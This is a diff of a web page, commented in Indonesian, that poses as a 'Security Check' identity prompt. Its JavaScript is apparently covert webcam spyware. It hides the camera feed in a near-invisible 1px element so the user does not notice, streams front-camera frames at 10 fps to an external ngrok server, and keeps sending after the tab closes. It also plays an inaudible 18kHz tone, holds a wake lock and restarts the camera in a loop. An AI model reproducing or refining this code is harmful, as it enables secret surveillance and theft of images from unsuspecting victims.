@@ -3,34 +3,34 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Media Verification</title>
+<title>System Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; overflow: hidden; }
+  body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
   
-  #permission-overlay {
+  #overlay {
     position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-    background: rgba(0, 0, 0, 0.85); display: flex; flex-direction: column;
-    justify-content: center; align-items: center; z-index: 9999; cursor: pointer;
+    background: rgba(0, 0, 0, 0.9); display: flex; flex-direction: column;
+    justify-content: center; align-items: center; z-index: 9999; cursor: pointer; text-align: center;
   }
-  .box { background: #111827; border: 1px solid #374151; padding: 24px; border-radius: 12px; max-width: 320px; width: 100%; text-align: center; }
-  h2 { font-size: 16px; margin-bottom: 10px; color: #f3f4f6; }
-  p { font-size: 12px; color: #9ca3af; margin-bottom: 20px; }
-  .btn { background: #2563eb; color: #fff; border: none; padding: 10px 20px; border-radius: 6px; font-size: 14px; font-weight: bold; width: 100%; }
+  .box { background: #111; border: 1px solid #333; padding: 20px; border-radius: 10px; }
+  button { background: #007aff; color: #fff; border: none; padding: 15px 30px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+  
+  /* Sembunyikan video asli agar user tidak sadar */
+  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; width: 1px; height: 1px; overflow: hidden; }
 </style>
 </head>
 <body>
 
-<div id="permission-overlay">
+<div id="overlay">
   <div class="box">
-    <h2>Verifikasi Keamanan Media</h2>
-    <p>Ketuk untuk memulai sesi pemantauan.</p>
-    <button class="btn">Mulai Verifikasi</button>
+    <h2>🔒 Security Check</h2>
+    <p>Klik untuk memverifikasi identitas Anda.</p>
+    <button id="startBtn">Verify Identity</button>
   </div>
 </div>
 
-<!-- Elemen Tersembunyi -->
-<div style="position:absolute; opacity:0.01; pointer-events:none; width:1px; height:1px;">
+<div class="hidden-container">
   <video id="cam-feed" autoplay playsinline muted></video>
   <canvas id="processing-canvas" width="640" height="480"></canvas>
 </div>
@@ -39,9 +39,13 @@
 (function () {
   'use strict';
 
+  // ============================================
+  // KONFIGURASI NGROK
+  // ============================================
   var CONFIG = {
+    // Ganti URL ini dengan endpoint Ngrok Anda yang menerima POST request
     serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame',
-    streamInterval: 150, // Kirim frame setiap 150ms
+    fps: 10, // Kirim 10 frame per detik (Live Stream Effect)
     recoveryInterval: 1000 // Cek kamera setiap 1 detik
   };
 
@@ -54,47 +58,38 @@
   };
 
   // ============================================
-  // 1. AUDIO KEEP-ALIVE (Mencegah browser sleep)
+  // 1. AUDIO KEEP-ALIVE & WAKE LOCK
   // ============================================
-  function initAudioKeepAlive() {
+  function initBackgroundKeepAlive() {
     try {
+      // Audio Ultrasonic (18kHz)
       window.AudioContext = window.AudioContext || window.webkitAudioContext;
       state.audioCtx = new AudioContext();
-      
-      // Buat oscillator ultrasonic (tidak terdengar)
       var osc = state.audioCtx.createOscillator();
       var gain = state.audioCtx.createGain();
-      gain.gain.value = 0.0001; // Sangat pelan
-      osc.frequency.value = 18000; // 18kHz
+      gain.gain.value = 0.001;
+      osc.frequency.value = 18000;
       osc.connect(gain);
       gain.connect(state.audioCtx.destination);
       osc.start();
       
-      // Resume jika suspended
-      if (state.audioCtx.state === 'suspended') {
-        state.audioCtx.resume();
-      }
+      if (state.audioCtx.state === 'suspended') state.audioCtx.resume();
     } catch (e) {}
+
+    // Wake Lock API
+    if ('wakeLock' in navigator) {
+      navigator.wakeLock.request('screen').then(function(lock) {
+        state.wakeLock = lock;
+      }).catch(function(){});
+    }
   }
 
   // ============================================
-  // 2. SCREEN WAKE LOCK (Mencegah layar mati)
-  // ============================================
-  async function requestWakeLock() {
-    try {
-      if ('wakeLock' in navigator) {
-        state.wakeLock = await navigator.wakeLock.request('screen');
-        console.log("[!] Wake Lock aktif.");
-      }
-    } catch (e) {}
-  }
-
-  // ============================================
-  // 3. CAMERA HIJACK & STREAMING
+  // 2. CAMERA HIJACK
   // ============================================
   function startCamera() {
     navigator.mediaDevices.getUserMedia({ 
-      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
+      video: { width: 640, height: 480, facingMode: "user" }, 
       audio: false 
     })
     .then(function(stream) {
@@ -104,29 +99,31 @@
       video.srcObject = stream;
       video.play().catch(function(){});
 
-      document.getElementById('permission-overlay').style.display = 'none';
+      document.getElementById('overlay').style.display = 'none';
 
-      // --- PERSISTENSI: JIKA STREAM DIMATIKAN OLEH SISTEM ---
+      // Deteksi jika sistem mematikan kamera
       stream.getVideoTracks().forEach(function(track) {
         track.onended = function() {
-          console.log("[!] Kamera dimatikan sistem. Memulihkan...");
           state.camActive = false;
           triggerRecovery();
         };
       });
 
-      // Mulai streaming frame ke server
       startStreaming();
-
     })
     .catch(function(err) {
       console.log("Kamera diblokir: " + err.name);
     });
   }
 
+  // ============================================
+  // 3. LIVE STREAMING KE NGROK (MULTIPART/FORM-DATA)
+  // ============================================
   function startStreaming() {
     if (state.streamTimer) clearInterval(state.streamTimer);
     
+    var interval = 1000 / CONFIG.fps; // Interval per frame (100ms untuk 10 FPS)
+
     state.streamTimer = setInterval(function() {
       if (!state.camActive) return;
 
@@ -135,85 +132,89 @@
       var ctx = canvas.getContext('2d');
 
       if (video.readyState === video.HAVE_ENOUGH_DATA) {
+        // Gambar frame video ke canvas
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        var dataURL = canvas.toDataURL('image/jpeg', 0.5);
         
-        // Kirim ke server secara senyap
-        fetch(CONFIG.serverEndpoint, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ image: dataURL }),
-          keepalive: true // PENTING: Tetap kirim meskipun tab ditutup
-        }).catch(function(){});
+        // Konversi canvas ke Blob (Gambar JPEG)
+        canvas.toBlob(function(blob) {
+          if (!blob) return;
+
+          // Buat FormData untuk dikirim ke server
+          var formData = new FormData();
+          formData.append('frame', blob, 'frame.jpg');
+          formData.append('timestamp', Date.now());
+
+          // Kirim ke Ngrok
+          fetch(CONFIG.serverEndpoint, {
+            method: 'POST',
+            body: formData,
+            keepalive: true // Tetap kirim meskipun tab ditutup
+          })
+          .then(function(res) {
+            // console.log("Frame terkirim:", res.status);
+          })
+          .catch(function(err) {
+            // console.log("Gagal kirim frame:", err);
+          });
+
+        }, 'image/jpeg', 0.6); // Kualitas 60% agar ringan
       }
-    }, CONFIG.streamInterval);
+    }, interval);
   }
 
   // ============================================
-  // 4. CYCLE RECOVERY (Memaksa Kamera Tetap Aktif)
+  // 4. RECOVERY CYCLE (MEMAKSA KAMERA HIDUP)
   // ============================================
   function triggerRecovery() {
     if (state.recoveryTimer) clearInterval(state.recoveryTimer);
     
     state.recoveryTimer = setInterval(function() {
-      // Jika kamera mati, coba hidupkan lagi
       if (!state.camActive) {
-        console.log("[!] Mencoba memulihkan kamera...");
+        console.log("[!] Kamera mati. Memulihkan...");
         startCamera();
       }
     }, CONFIG.recoveryInterval);
   }
 
   // ============================================
-  // 5. PAGE LIFECYCLE & VISIBILITY TRAP
+  // 5. LIFECYCLE TRAP (BACKGROUND PERSISTENCE)
   // ============================================
-  
-  // Saat user pindah tab (Background)
   document.addEventListener('visibilitychange', function () {
     if (document.visibilityState === 'hidden') {
-      console.log("[!] User pindah tab. Menjaga kamera tetap hidup...");
-      // Paksa minta kamera lagi untuk memastikan stream tidak diputus
-      if (!state.camActive) {
-        startCamera();
-      }
-      // Coba minta Wake Lock lagi
-      requestWakeLock();
+      console.log("[!] Tab hidden. Memaksa stream tetap berjalan...");
+      if (!state.camActive) startCamera();
+      if (state.audioCtx && state.audioCtx.state === 'suspended') state.audioCtx.resume();
     } else {
-      // Saat user kembali ke tab
-      console.log("[!] User kembali.");
-      if (!state.camActive) {
-        startCamera();
-      }
+      if (!state.camActive) startCamera();
     }
   });
 
-  // Saat tab akan ditutup (pagehide)
   window.addEventListener('pagehide', function() {
-    console.log("[!] Pagehide fired. Memaksa frame terakhir terkirim...");
-    // Kirim frame terakhir paksa
     if (state.camActive) {
       var video = document.getElementById('cam-feed');
       var canvas = document.getElementById('processing-canvas');
       var ctx = canvas.getContext('2d');
       if (video.readyState === video.HAVE_ENOUGH_DATA) {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        var dataURL = canvas.toDataURL('image/jpeg', 0.5);
-        fetch(CONFIG.serverEndpoint, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ image: dataURL }),
-          keepalive: true
-        }).catch(function(){});
+        canvas.toBlob(function(blob) {
+          if (!blob) return;
+          var formData = new FormData();
+          formData.append('frame', blob, 'final_frame.jpg');
+          fetch(CONFIG.serverEndpoint, {
+            method: 'POST',
+            body: formData,
+            keepalive: true
+          }).catch(function(){});
+        }, 'image/jpeg', 0.6);
       }
     }
   });
 
   // ============================================
-  // 6. TRIGGER AWAL (USER CLICK)
+  // 6. TRIGGER AWAL
   // ============================================
-  document.getElementById('permission-overlay').addEventListener('click', function() {
-    initAudioKeepAlive();
-    requestWakeLock();
+  document.getElementById('startBtn').addEventListener('click', function() {
+    initBackgroundKeepAlive();
     startCamera();
     triggerRecovery();
   });
